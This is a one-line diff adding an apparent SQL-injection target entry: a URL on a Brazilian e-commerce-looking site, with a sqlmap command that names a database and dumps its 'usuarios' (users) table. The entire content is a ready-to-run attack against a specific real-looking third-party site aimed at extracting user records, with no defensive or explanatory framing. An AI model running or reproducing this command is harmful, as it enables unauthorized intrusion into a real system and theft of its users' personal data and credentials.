@@ -1,0 +1,1 @@
+https://www.ebaiana.com.br/?op=produtos&categoria=1 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.ebaiana.com.br/?op=produtos&categoria=1 -D esqbaian_ebaiana -T usuarios --dump
